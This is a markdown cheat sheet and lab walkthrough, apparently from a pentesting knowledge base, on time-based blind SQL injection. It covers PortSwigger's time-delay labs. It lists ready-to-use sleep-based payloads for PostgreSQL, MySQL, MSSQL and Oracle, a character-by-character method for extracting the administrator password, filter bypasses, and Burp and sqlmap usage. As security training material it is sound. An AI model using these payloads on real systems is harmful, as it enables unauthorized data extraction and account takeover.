# SQL injection — Blind (time-based)

No content difference, no error difference — but the query runs synchronously, so you can make the response **slow** only when a condition is true. Response time becomes your 1-bit oracle. The fallback that works when boolean/error don't. Max impact: full data extraction purely from timing.

## Quick reference

```
-- unconditional delay (proves time-based SQLi + fingerprints DB)
'||pg_sleep(10)--                                   -- PostgreSQL
'; SELECT pg_sleep(10)--                            -- PostgreSQL (stacked)
'; WAITFOR DELAY '0:0:10'--                         -- MSSQL
' AND SLEEP(10)--                                   -- MySQL
' AND 1=(SELECT 1 FROM (SELECT SLEEP(10))x)--       -- MySQL (subquery form)
|| (SELECT '' FROM dual WHERE 1=1 AND 1=dbms_pipe.receive_message(('a'),10))  -- Oracle
-- conditional delay (the oracle)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--            -- Postgres
'; IF (1=1) WAITFOR DELAY '0:0:10'--                                          -- MSSQL
' AND IF(1=1,SLEEP(10),0)--                                                   -- MySQL
-- extraction
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,N,1)='X') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Decision list:
- Unconditional `pg_sleep(10)`/`SLEEP(10)`/`WAITFOR` actually delays ~10s → time-based confirmed + DB fingerprinted.
- Wrap the delay in `CASE WHEN (cond)` / `IF(cond,...)` → conditional oracle.
- Extract length then chars with `SUBSTRING`; the slow response = true bit.
- If even timing doesn't work (async query) → `../Out-of-band-OAST/`.

## Root cause
Injection into a synchronously-executed query where neither rows nor errors are observable, but execution time is. Every engine has a sleep primitive.

## Find it (recon and detection)
- Send an **unconditional** delay payload appropriate to a guessed DB; a ~10s response confirms both injection and engine. Cycle `pg_sleep`/`SLEEP`/`WAITFOR`/Oracle to fingerprint.
- Beware network jitter — use a long delay (10s) so signal ≫ noise; repeat to confirm.

## Technique
1. **Confirm + fingerprint** with an unconditional sleep (table above).
2. **Conditional oracle:** wrap in `CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` (Postgres) / `IF(cond,SLEEP(10),0)` (MySQL) / `IF (cond) WAITFOR DELAY '0:0:10'` (MSSQL).
3. **Confirm target:** `... WHEN (username='administrator') ...` from `users` → delay ⇒ user exists.
4. **Length:** `... (username='administrator' AND LENGTH(password)>N) ...`, ladder N until the delay stops ⇒ length.
5. **Chars:** `... (username='administrator' AND SUBSTRING(password,i,1)='X') ...`, sweep `X` over `a-z0-9` per position `i`. Slow row = the char.

**Advanced / edge cases:**
- **Single-thread Intruder:** run the extraction with **max concurrent requests = 1** (Resource pool) so overlapping requests don't smear the timing signal. Read the "Response received" (ms) column; ~10000ms row wins.
- **Binary search on time:** `SUBSTRING(...) > 'm'` → delay/no-delay halves the charset per request (~6 requests/char vs 36).
- **Stacked vs inline:** Postgres/MSSQL/MySQL support stacked (`; SELECT ...`); Oracle does not (use `dbms_pipe.receive_message` inline). MySQL `SLEEP` must sit where it's evaluated per row — `AND IF(...)` or a subquery.
- **Oracle delay:** `dbms_pipe.receive_message(('a'),10)`; conditional: `SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`.
- **Heavy-query fallback** (no sleep priv): force a slow operation conditionally (e.g. large cartesian/`generate_series`), though sleeps are cleaner.
- **URL-encoding in cookies:** encode `;` as `%3B` and spaces as `+` when the payload rides in a cookie/query string.

## Payload arsenal
```sql
-- unconditional (fingerprint)
'||pg_sleep(10)--
'; SELECT pg_sleep(10)--
'; WAITFOR DELAY '0:0:10'--
' AND SLEEP(10)--             ' AND (SELECT SLEEP(10))--
-- conditional oracle
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--        -- PG, URL-enc
'; IF (1=1) WAITFOR DELAY '0:0:10'--                                       -- MSSQL
' AND IF(1=1,SLEEP(10),0)-- -                                              -- MySQL
-- extraction (PostgreSQL)
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
-- extraction (MySQL / MSSQL)
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a',SLEEP(10),0)-- -
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

## Bypasses
| Blocker | Bypass |
|---|---|
| `SLEEP`/`pg_sleep` filtered | `BENCHMARK(5000000,MD5(1))` (MySQL); heavy query; `WAITFOR` (MSSQL) |
| stacked queries blocked | inline forms: `AND IF(...)`, `||pg_sleep()`, Oracle `dbms_pipe` |
| timing noisy | longer delay (15-20s), single-thread, repeat, statistical median |
| spaces filtered | `/**/`, `%0a`; `pg_sleep(10)` needs no spaces |

## Exploitation walkthrough (Postgres, TrackingId cookie)
1. `TrackingId=x'||pg_sleep(10)--` → ~10s response ⇒ time-based, Postgres.
2. `TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` → delay (true); `1=2` → instant (false). Oracle works.
3. `... WHEN (username='administrator') ... FROM users` → delay ⇒ admin exists.
4. Ladder `LENGTH(password)>N` → delay stops at N=21 ⇒ 20 chars.
5. Intruder (single thread), payload on the char: `SUBSTRING(password,§1§,1)='§a§'`, position×charset. The ~10000ms row = each char. Reassemble, log in → solved.

## Chaining
- Output is creds → [Authentication](../../Authentication/) / [Access-control](../../Access-control/).
- Timing-as-oracle generalizes to [timing side-channels](../../Access-control/) and blind [NoSQL-injection](../../NoSQL-injection/).

## Tools
- **Burp Repeater:** confirm unconditional delay; eyeball response time.
- **Burp Intruder:** single-threaded resource pool, watch "Response received" ms; cluster-bomb position×char.
- **sqlmap:** `--technique=T --time-sec=10` automates time-based extraction.

## Labs

### Lab: Blind SQL injection with time delays [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
- Method: set `TrackingId=x'||pg_sleep(10)--`; the 10-second response proves time-based SQLi. (Solve only requires triggering the delay.)
- Insight: `||pg_sleep(10)` runs inline within the WHERE; the stall is the signal. Real-target transfer: when nothing else differs, an injected sleep that delays the response confirms blind SQLi.

### Lab: Blind SQL injection with time delays and information retrieval [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
- Method: conditional `'; SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`. Confirm administrator, ladder `LENGTH(password)>N` (=20), then Intruder `SUBSTRING(password,i,1)='X'` single-threaded; the ~10s row per position gives the char. Log in.
- Insight: CASE+pg_sleep makes timing depend on one boolean; single-thread keeps the timing clean.
- Real-target transfer: identical extraction loop as boolean blind, just oracle = response time.

## Real-world notes
- Time-based is the most universally applicable blind method but the slowest and noisiest; reserve full extraction for labs/authorized PoCs.
- On live targets, prove with one conditional delay (e.g. confirm `current_user` length) rather than dumping tables — it's both safer and less load.
- CVSS: same data-impact as visible SQLi; note potential DoS if sleeps are abused (don't).

## References
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
